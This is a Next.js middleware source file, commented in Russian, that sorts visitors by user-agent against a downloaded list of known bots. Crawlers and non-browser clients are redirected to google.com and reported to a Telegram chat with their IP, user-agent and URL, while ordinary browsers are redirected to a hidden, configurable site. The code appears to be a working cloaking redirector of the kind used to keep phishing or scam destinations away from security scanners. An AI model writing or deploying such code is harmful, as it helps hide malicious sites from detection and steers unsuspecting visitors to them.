// middleware.js
import { NextResponse } from "next/server";
//

function safeStringify(obj, maxDepth = 3) {
  const seen = new WeakSet();
  function _replacer(value, depth) {
    if (value === null) return null;
    if (typeof value === "function") return "[Function]";
    if (typeof value === "symbol") return value.toString();
    if (typeof value !== "object") return value;
    if (seen.has(value)) return "[Circular]";
    if (depth <= 0) return "[MaxDepth]";
    seen.add(value);
    const out = Array.isArray(value) ? [] : {};
    try {
      for (const k of Object.keys(value)) {
        try {
          out[k] = _replacer(value[k], depth - 1);
        } catch (e) {
          out[k] = `[Error reading property: ${e?.message || e}]`;
        }
      }
    } catch (e) {
      return `[Error iterating object: ${e?.message || e}]`;
    }
    return out;
  }
  try {
    return JSON.stringify(_replacer(obj, maxDepth), null, 2);
  } catch (e) {
    return `[[safeStringify failed: ${e?.message || e}]]`;
  }
}

function debugRequestDomain(req) {
  const debug = {
    ts: new Date().toISOString(),
    typeofReq: typeof req,
    isNullish: req == null,
    headerApi: null,
    headerKeys_method: null,
    headerKeys_object: null,
    sampledHeaders: {},
    attempts: [],
  };

  // безопасный getter заголовка (попробуем несколько реализаций)
  function getHeader(name) {
    try {
      // 1) Web Headers API
      if (req && typeof req.headers?.get === "function") {
        debug.headerApi = debug.headerApi || "Headers.get";
        const v = req.headers.get(name);
        if (v != null) return v;
      }
      // 2) iterable headers (for..of)
      if (req && typeof req.headers?.entries === "function") {
        debug.headerApi = debug.headerApi || "Headers.entries";
        for (const [k, v] of req.headers.entries()) {
          if (!debug.headerKeys_method) debug.headerKeys_method = [];
          debug.headerKeys_method.push(k);
          if (k.toLowerCase() === name.toLowerCase()) return v;
        }
      }
      // 3) plain object headers (some runtimes)
      if (req && req.headers && typeof req.headers === "object") {
        debug.headerApi = debug.headerApi || "headers.object";
        // try direct key and lowercase
        if (req.headers[name]) return req.headers[name];
        if (req.headers[name.toLowerCase()]) return req.headers[name.toLowerCase()];
        // collect keys for debug
        if (!debug.headerKeys_object) debug.headerKeys_object = Object.keys(req.headers).slice(0, 200);
      }
      // 4) rawHeaders (node-ish)
      if (req && Array.isArray(req.rawHeaders)) {
        debug.headerApi = debug.headerApi || "rawHeaders";
        for (let i = 0; i + 1 < req.rawHeaders.length; i += 2) {
          const k = req.rawHeaders[i];
          const v = req.rawHeaders[i + 1];
          if (k && k.toLowerCase() === name.toLowerCase()) return v;
        }
      }
      // 5) req.getHeader if available
      if (req && typeof req.getHeader === "function") {
        debug.headerApi = debug.headerApi || "getHeader";
        const v = req.getHeader(name);
        if (v != null) return v;
      }
    } catch (e) {
      debug.attempts.push({ getHeaderError: `${name} -> ${e?.message || e}` });
    }
    return undefined;
  }

  // Попробуем безопасно собрать все заголовки (несколько способов)
  try {
    // попытка 1: headers.entries()
    if (req && typeof req.headers?.entries === "function") {
      const h = {};
      for (const [k, v] of req.headers.entries()) {
        h[k] = v;
      }
      debug.sampledHeaders.fromEntries = Object.keys(h).length ? h : undefined;
    }
  } catch (e) {
    debug.sampledHeaders.fromEntriesError = e?.message || e;
  }

  try {
    // попытка 2: plain object
    if (req && req.headers && typeof req.headers === "object" && !Array.isArray(req.headers)) {
      debug.sampledHeaders.fromObject = Object.keys(req.headers).slice(0, 200).reduce((acc, k) => {
        acc[k] = req.headers[k];
        return acc;
      }, {});
    }
  } catch (e) {
    debug.sampledHeaders.fromObjectError = e?.message || e;
  }

  try {
    // попытка 3: rawHeaders array
    if (req && Array.isArray(req.rawHeaders)) {
      const h = {};
      for (let i = 0; i + 1 < req.rawHeaders.length; i += 2) {
        h[req.rawHeaders[i]] = req.rawHeaders[i + 1];
      }
      debug.sampledHeaders.rawHeaders = h;
    }
  } catch (e) {
    debug.sampledHeaders.rawHeadersError = e?.message || e;
  }

  // Популярные header-кандидаты
  const candidates = [
    "x-forwarded-host",
    "x-netlify-host",
    "x-original-host",
    "x-forwarded-server",
    "host",
    "origin",
    "referer",
    "referrer",
    "x-forwarded-proto",
    "x-real-ip",
    "x-forwarded-for",
  ];

  const found = {};
  for (const h of candidates) {
    try {
      found[h] = getHeader(h) ?? null;
    } catch (e) {
      found[h] = `[error: ${e?.message || e}]`;
    }
  }
  debug.attemptedCandidates = found;

  // Попробуем извлечь домен из referer/origin если есть
  function tryParseHostFromUrl(u) {
    try {
      if (!u) return null;
      // иногда referer приходит с лишними пробелами
      const s = String(u).trim();
      if (!s) return null;
      // если это уже просто host (без протокола) — попробуем вернуть как есть
      if (!s.includes("://") && s.split("/")[0].includes(".")) return s.split("/")[0];
      const parsed = new URL(s);
      return parsed.host || parsed.hostname || null;
    } catch (e) {
      return null;
    }
  }

  // Собираем кандидатов домена в порядке приоритета
  let domain = "unknown-domain";
  try {
    const byHeader = [
      getHeader("x-forwarded-host"),
      getHeader("x-netlify-host"),
      getHeader("x-original-host"),
      getHeader("host"),
      getHeader("x-forwarded-server"),
    ].find(Boolean);
    if (byHeader) {
      domain = String(byHeader).split(",")[0].trim();
      debug.attempts.push({ used: "header-first", value: domain });
    } else {
      // origin / referer
      const origin = getHeader("origin");
      const referer = getHeader("referer") || getHeader("referrer");
      const parsedFromOrigin = tryParseHostFromUrl(origin) || tryParseHostFromUrl(referer);
      if (parsedFromOrigin) {
        domain = parsedFromOrigin;
        debug.attempts.push({ used: "origin/referer", value: domain });
      } else {
        // req.nextUrl (Next.js middleware)
        try {
          if (req && req.nextUrl && (req.nextUrl.host || req.nextUrl.hostname || req.nextUrl.href)) {
            const nu = req.nextUrl.host || req.nextUrl.hostname || req.nextUrl.href;
            domain = String(nu).replace(/\/+$/, "");
            debug.attempts.push({ used: "nextUrl", value: domain });
          } else if (typeof req?.url === "string" && req.url) {
            // безопасно парсим req.url
            const parsed = tryParseHostFromUrl(req.url);
            if (parsed) {
              domain = parsed;
              debug.attempts.push({ used: "req.url", value: domain });
            }
          }
        } catch (e) {
          debug.attempts.push({ nextUrl_or_req_url_error: e?.message || e });
        }
      }
    }
  } catch (e) {
    debug.attempts.push({ finalDomainError: e?.message || e });
  }

  // дополнительные поля для отладки
  try {
    debug.nextUrl = (req && req.nextUrl) ? (typeof req.nextUrl === "object" ? { ...("href" in req.nextUrl ? { href: req.nextUrl.href } : {}), host: req.nextUrl?.host, pathname: req.nextUrl?.pathname } : String(req.nextUrl)) : null;
  } catch (e) {
    debug.nextUrlError = e?.message || e;
  }

  try {
    debug.reqUrl = typeof req?.url === "string" ? req.url : (req?.url ? "[non-string url]" : null);
  } catch (e) {
    debug.reqUrlError = e?.message || e;
  }

  // логируем компактно — безопасно
  try {
    console.log("[DEBUG REQUEST DOMAIN] summary:");
    console.log("-> Best guess domain:", domain);
    console.log("-> Debug snapshot:\n", safeStringify(debug, 3));
  } catch (e) {
    // на всякий — чтобы сборка не падала при логировании
    console.log("[DEBUG REQUEST DOMAIN] logging failed:", e?.message || e);
  }

  return { domain, debug };
}



//
const BOT_JSON_URL = "https://raw.githubusercontent.com/arcjet/well-known-bots/main/well-known-bots.json";
const URL_SITE = process.env.URL_SITE || "https://yahoo.com"; 
const BOT_LIST_TTL = 60 * 60 * 1000; // кешировать 1 час
const TELEGRAM_TIMEOUT_MS = 700; // таймаут для вызова телеграма в middleware

// Вставь сюда токен/чат или используй env-переменные
const BOT_TOKEN = process.env.TG_BOT_TOKEN || ""; // например '6438....'
const CHAT_ID = process.env.TG_CHAT_ID || "";     // например '1743635369'

// кэш в глобальной области (edge runtime / serverless может переиспользовать)
if (!globalThis.__bot_cache) {
  globalThis.__bot_cache = { regexes: [], fetchedAt: 0, fetching: null };
}

async function loadBotRegexes() {
  const now = Date.now();
  const cache = globalThis.__bot_cache;

  // если в кэше и не устарело — вернуть
  if (cache.regexes.length && now - cache.fetchedAt < BOT_LIST_TTL) return cache.regexes;

  // если уже идёт fetch — дождаться его
  if (cache.fetching) {
    try { await cache.fetching } catch(e) {}
    return cache.regexes;
  }

  // запускаем fetch и сохраняем промис в cache.fetching
  cache.fetching = (async () => {
    try {
      const res = await fetch(BOT_JSON_URL, { cf: { cacheTtl: 3600 } });
      if (!res.ok) {
        console.warn("bot list fetch failed", res.status);
        cache.fetching = null;
        return cache.regexes;
      }
      const json = await res.json();

      const regexes = [];
      if (Array.isArray(json)) {
        for (const entry of json) {
          // entry может быть строкой или объектом { pattern: "..." }
          let pattern = null;
          if (typeof entry === "string") pattern = entry;
          else if (entry && typeof entry.pattern === "string") pattern = entry.pattern;
          else if (entry && typeof entry.ua === "string") pattern = entry.ua;

          if (!pattern) continue;

          // если pattern выглядит как /.../ то вырежем / и флаги (в случае)
          let rx = null;
          try {
            if (pattern.startsWith("/") && pattern.lastIndexOf("/") > 0) {
              const last = pattern.lastIndexOf("/");
              const body = pattern.slice(1, last);
              const flags = pattern.slice(last + 1);
              rx = new RegExp(body, flags.includes("i") ? flags : flags + "i");
            } else {
              // безопасно создаём RegExp (экранируем обычные строки? но часто в списках уже regex)
              // попытаемся сначала как регулярку, если упадёт — используем простую includes-проверку ниже
              try {
                rx = new RegExp(pattern, "i");
              } catch (e) {
                // если невалидная regex, превратим в экранированную строку
                rx = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
              }
            }
          } catch (e) {
            continue;
          }
          if (rx) regexes.push(rx);
        }
      }
      cache.regexes = regexes;
      cache.fetchedAt = Date.now();
    } catch (e) {
      console.warn("Error loading bot patterns:", e?.message || e);
    } finally {
      cache.fetching = null;
    }
  })();

  await cache.fetching;
  return cache.regexes;
}

function getDomain(req) {
  if (!req) return "unknown-domain";

  try {
    const getHeader = (name) => {
      // разные runtime дают разные header-APIs: Headers или plain object
      if (typeof req.headers?.get === "function") return req.headers.get(name);
      if (req.headers && typeof req.headers === "object") return req.headers[name];
      return undefined;
    };

    // check common headers (order matters)
    const candidates = [
      "x-forwarded-host",
      "x-netlify-host",     // возможный кастомный заголовок
      "x-original-host",
      "host",
    ];

    for (const h of candidates) {
      const v = getHeader(h);
      if (v) return v;
    }

    // referer часто содержит оригинальный дом
    const referer = getHeader("referer") || getHeader("referrer");
    if (referer) {
      try { return new URL(referer).host; } catch (e) { /* ignore */ }
    }

    // безопасно попробовать req.url (если существует и валиден)
    if (typeof req.url === "string" && req.url) {
      try { return new URL(req.url).host; } catch (e) { /* ignore */ }
    }
  } catch (err) {
    console.warn("getDomainFromRequest failed:", err);
  }

  return "unknown-domain";
}

async function notifyTelegram(text, req, data = {}) {
  const { domain, debug } = debugRequestDomain(req);
  // Доп.логи если надо
  console.log("DETECTED DOMAIN (for middleware):", domain);

  const token = BOT_TOKEN || process.env.TG_BOT_TOKEN;
  const chat = CHAT_ID || process.env.TG_CHAT_ID;
  if (!token || !chat) {
    console.warn("Telegram token/chat not set");
    return;
  }

  // пробуем вытащить домен
  const finalText = `🌐 ${domain}\n${text}`;

  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chat, text: finalText }),
      signal: controller.signal,
    });
  } catch (e) {
    console.warn("Telegram notify failed (ignored)", e?.message || e);
  } finally {
    clearTimeout(id);
  }
}


export async function middleware(req) {
  const ua = req.headers.get("user-agent") || "";

  const isHumanLike = ua.includes("Mozilla");
  
  const url = req.nextUrl.pathname + (req.nextUrl.search || "");
  const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";

  // пустой юа — сразу считаем ботом
  if (!isHumanLike) {
    // шлём уведомление (не ждём долго)
    notifyTelegram(`🚨 Подозрительный UA: ${ua}\nIP: ${ip}\nURL: ${url}`);
    return NextResponse.redirect("https://google.com");
  }

  // загружаем паттерны (из кэша или сети)
  let regexes = [];
  try {
    regexes = await loadBotRegexes();
  } catch (e) {
    console.warn("loadBotRegexes failed", e?.message || e);
  }

  // быстрое совпадение по regexp
  const isBot = regexes.some(rx => {
    try { return rx.test(ua); } catch (e) { return false; }
  });

  if (isBot) {
    // уведомление и редирект
    notifyTelegram(`🚨 Known bot detected\nUA: ${ua}\nIP: ${ip}\nURL: ${url}`);
    return NextResponse.redirect("https://google.com");
  }
  //return NextResponse.next();
  return NextResponse.redirect(URL_SITE);
  
  // не бот — пускаем дальше
  //return NextResponse.next();
}

// применяем на все роуты
export const config = { matcher: ["/:path*"] };
